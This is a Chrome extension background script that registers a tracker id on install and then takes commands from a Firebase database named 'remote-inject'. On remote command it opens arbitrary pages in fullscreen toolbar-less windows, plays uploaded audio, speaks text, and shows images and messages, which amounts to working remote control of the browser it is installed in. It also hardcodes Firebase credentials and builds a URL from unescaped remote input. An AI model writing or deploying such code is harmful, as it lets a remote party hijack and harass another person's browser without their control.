chrome.extension.onMessage.addListener(
  function(request, sender, sendResponse) {
  	chrome.pageAction.show(sender.tab.id);
    sendResponse();
});

function makeid(length) {
  var result           = [];
  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  var charactersLength = characters.length;
  for ( var i = 0; i < length; i++ ) {
    result.push(characters.charAt(Math.floor(Math.random() * charactersLength)));
 }
 return result.join('');
}

var trackerid = ""
var first = false
chrome.runtime.onInstalled.addListener((details) => {
  if(details.reason == "install"){
    trackerid = makeid(6)
    chrome.storage.sync.set({'trackerid': trackerid}, () => {
      alert("Installed! Your tracker id is " + trackerid)
      localStorage.setItem("firstDone", "yes")
      main()
    })
  }
})

if(localStorage.getItem("firstDone") == "yes"){
  main()
}

let firsttime = true
var params = [
  'height='+screen.height,
  'width='+screen.width,
  'fullscreen=yes'
].join(',');

function main(){
  chrome.storage.sync.get(['trackerid'], res => {
    trackerid = res.trackerid

    const firebaseConfig = {
      apiKey: "AIzaSyBo2XACbM2X2YdEpGnxv8CL-kMSeMtjUBk",
      authDomain: "remote-inject.firebaseapp.com",
      projectId: "remote-inject",
      storageBucket: "remote-inject.appspot.com",
      messagingSenderId: "876245411694",
      appId: "1:876245411694:web:d6b8165ada4c661a25837f",
      measurementId: "G-76CQK0K24J"
    };
    firebase.initializeApp(firebaseConfig);
    
    var ref = firebase.database().ref("/trackers/" + trackerid)
    var storage = firebase.storage()

    function doWithFile(refr, callback){
      storage.ref(refr).getDownloadURL().then((url) => {
        callback(url)
        setTimeout(() => {
          storage.ref(refr).delete()
        }, 10000)
      })
    }

    ref.on('value', snap => {
      if(snap.val() == null) {return}
      if(firsttime) {firsttime = false; return}
      switch(snap.val().type){
        case "link":
          if(snap.val().openInNewWindow){
            let newwindow = window.open(snap.val().url, "_blank", "toolbar=0,location=0,menubar=0," + params)
            newwindow.focus()
          } else{
            window.open(snap.val().url).focus()
          }
          break
        case "audio":
          doWithFile(snap.val().ref, (url) => {
            let audio = new Audio(url)
            audio.play()
          })
          break
        case "tts":
          chrome.tts.speak(snap.val().text)
          break
        case "message":
          window.open("http://127.0.0.1:5500/message/?title=" + snap.val().title + "&body=" + snap.val().body, "_blank", "toolbar=0,location=0,menubar=0," + params)
          break
        case "image":
          doWithFile(snap.val().ref, (url) => {
            window.open(url, "_blank", "toolbar=0,location=0,menubar=0," + params)
          })
          break
      }
    })
  })
}